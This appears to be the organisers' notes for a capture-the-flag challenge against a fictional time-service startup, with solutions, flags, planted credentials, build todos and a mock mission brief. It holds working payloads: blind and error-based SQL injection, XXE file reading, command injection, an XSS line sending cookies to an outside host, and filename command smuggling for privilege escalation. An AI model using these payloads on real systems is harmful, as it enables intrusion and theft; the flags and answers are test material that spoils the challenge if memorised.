* !!! Read this file as RAW !!!

* Compagnies
** Startup 1 — WTIIaaS
   - What Time Is It as a Service
   - Interface pour avoir l'heure
* Solutions
** DONE Breaking into the intranet
   CLOSED: [2017-03-10 Fri 21:15]
   In /old/ (leaked through robots.txt) resides a crypto challenge. Once "reversed", a login to the intranet is given.
   Email: zana.elbert@wtiiaas.csg
   Password: FallOutBoyzForever1121
   It's a simple XOR with a satic ROT-n key.
   with open("out.bin", 'rb') as output:
     print("".join(magicify(output.read() ,key)))
** DONE Blind SQL injection API key leak
   CLOSED: [2017-02-25 Sat 01:12]
   <key>' or (8=substr((select key_guid from apikeys limit 1,1),1,1) and sleep(1)) #</key>
** DONE XXE
   CLOSED: [2017-02-25 Sat 01:12]
   In the API, free action `getTime' is vulnerable to XXE
<?xml version="1.0"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/api/api.php" >]>
<WTIIaaS>
  <identity>
    <key>&xxe;</key>
  </identity>
  
  <query action="getTime"/>
</WTIIaaS>
        
** DONE RCE (Command injection) — Requires premium API key to have leaked beforehand, possible through various means
   CLOSED: [2017-02-25 Sat 01:12]
   In the API, premium action `getTimeWithFormat' is vulnerable to a command injection in the `format' field
<?xml version="1.0"?>
<WTIIaaS>
  <identity>
    <key>85922064</key>
  </identity>
  
  <query action="getTimeWithFormat" format='%m";id;f="' />
</WTIIaaS>
** DONE Password dump
   CLOSED: [2017-02-25 Sat 01:12]
| Christia | Shore | shore.christia@wtiiaas.csg | f6432274349b5cb93433f8ed886a3f37 | winter |
Password reuse on pastebin, indexed @ http://pastebin.com/EFxqS501, uploaded Fri Feb 24 21:19:26 EST 2017
One of the ways to get to the intranet

** DONE INSERT SQLi in User-Agent ("logging" mechanism)
   CLOSED: [2017-02-25 Sat 01:13]
*** POC
   User-Agent: ' or extractvalue(1,concat(0x7e,(SELECT * from flag limit 0,1))) or '
   
   CSG_SomeThingsAreStrange
** DONE Steal the CEO's cookies
   CLOSED: [2017-03-01 Wed 23:14]
*** PoC
    <img id=f src=x /><script>var elem=document.getElementById('f');elem.src="http://192.168.0.199:8080/"+document.cookie;</script>
** DONE Extract the banking info from /home/sysadmin/banking.txt.pgp
   CLOSED: [2017-03-10 Fri 01:55]
   From a RCE, proceed to privilege escalate and extract the key from .bash_history
*** Local privilege escalation
    Vulnerable bash script running through crontab, as sysadmin
    Create files in /tmp with filename containing trailing bash commands.
    ie run $ touch "/tmp/a;cp -R \$HOME ."
    and then $ touch "/tmp/a;chmod -R 777 sysadmin"
    This will copy sysadmin's homedir to /tmp and make it world-readable. 
*** Decrypted file content
    $ gpg --passphrase "@\!YOUcantGUESSthis#@\!" --decrypt banking.txt.pgp
    Bank account
    ------------
    SWIFT/BIC: CSGS-US-35-A9F
    Password : HS9;~7HP9P@tYm;8nvo[|mL;:D%BwUh5-X'0!v%I
    
* Todos
** DONE Make mysql start automatically
   CLOSED: [2017-03-11 Sat 02:21]
** DONE Setup Mysql schema on image run
   CLOSED: [2017-03-11 Sat 15:05]
** WONTFIX Fix images in team (CFO/CTO)
** DONE Make API documentation in HTML
   CLOSED: [2017-03-09 Thu 16:01]
** WONTFIX Make employees.php page
** DONE Index a database dump [identitygenerator.py] → 
   CLOSED: [2017-02-24 Fri 21:18]
** DONE Make intranet login
   CLOSED: [2017-02-25 Sat 00:21]
** DONE Add User-Agent sql injection
   CLOSED: [2017-02-25 Sat 01:10]
** DONE Implement a messaging system
   CLOSED: [2017-02-25 Sat 18:11]
** DONE Implement a XSS bot for the CEO's account flag
   CLOSED: [2017-03-08 Wed 00:16]
   See ./src/wtiiaas/scripts/xss.js
** DONE Automate the XSS bot
   CLOSED: [2017-03-10 Fri 15:47]
*** See ./src/wtiiaas/scripts/xss.sh

** WONTFIX Make the instructions HTML
** DONE Privilege escalation from RCE
   CLOSED: [2017-03-10 Fri 00:29]
   Bash crontab running as sysadmin, banking file is owned by sysadmin
   See ./src/wtiiaas/scripts/deletetmp.sh
** DONE Generate PGP file with banking info
   CLOSED: [2017-03-01 Wed 22:13]
*** Command
    $ gpg --batch --yes --passphrase "@\!YOUcantGUESSthis#@\!" --output banking.txt.pgp --symmetric banking.txt
** DONE Add extra ways to login to intranet
   CLOSED: [2017-03-10 Fri 21:35]
** DONE Clean database before export
   CLOSED: [2017-03-11 Sat 15:06]
** DONE Make app use dedicated SQL user (nonroot)
   CLOSED: [2017-03-02 Thu 00:47]
** DONE Fix Dockerfile
   CLOSED: [2017-03-11 Sat 02:20]
** DONE Make webserver non www-data read-ONLY
   CLOSED: [2017-03-11 Sat 02:20]
** DONE Modify root password from ENV variable that will be set when container is RUN
   CLOSED: [2017-03-11 Sat 02:20]
** DONE Clean .bash_history for sysadmin to show GPG symmetric password
   CLOSED: [2017-03-11 Sat 02:20]
* Flags
** CSG-CIACantBreakThisCrapto (Crypto intranet message)
** CSG-WowItsAsIfXSSIsActuallyABigDeal (XSS)
** CSG_SomeThingsAreStrange (SQLi User-Agent)
** CSG-HarvestAllTheSessions (Steal session through XSS and check CEO's messages)


* Instructions
Comrades, the time has come.
Comrade Mao’s writings have proven true: Western imperialism is taking our country hostage! The 20-year-old millionaire programmers heading these startups are causing an immeasurable embarrassment to the homeland because of their sense of innovation and speedy development of revolutionary products. We see ourselves forced to create a super-mega-secret unit that will allow us to go to cyber-war with these profit thirsty imperialist Americans!
Your mission is to infiltrate the servers of one of these American startups and exfiltrate specific information. The information will then be relayed to the politburo of the Central Committee of the Communist Party in order to obtain an economic advantage. 
Rumor has it that a kiddie script exploited the site a few months ago and that a password dump is available online.
Your target: http://wtiiaas.csgames:YOUR_TEAMS_PORT/  (Written on your team’s credential sheet)

In solidarity,

Vos tâches:
- Obtenir la liste complète des employés
  - employees.txt
  - Nom, prénom, password
    
- Trouver le mot de passe du CEO
  - CEO-pass.txt
  - Mot de passe en clair, hashé = moitié des points
    
- Obtenir de l'exécution de code sur le serveur web
  - code-exec.txt
    - Instruction pour reproduire l'exécution de code (quelques lignes avec preuve de concept (PoC))
    
- Obtenir 
  
- Obtenir les privilèges `root' sur le serveur
  - Remise: rootwriteup.txt

- Quelques flags sont cachés sur le serveur.
  - flags.txt
    - Format: CSG_[a-zA-Z]+

  et votre patrie a besoin de vous afin de regagner du terrain sur l'économie mondiale. Ces damnés capitalistes de l'ouest nous mennent une lutte d'innovation sans relâche et semblent tous être  américains 

 votre patrie a besoin de vous. 
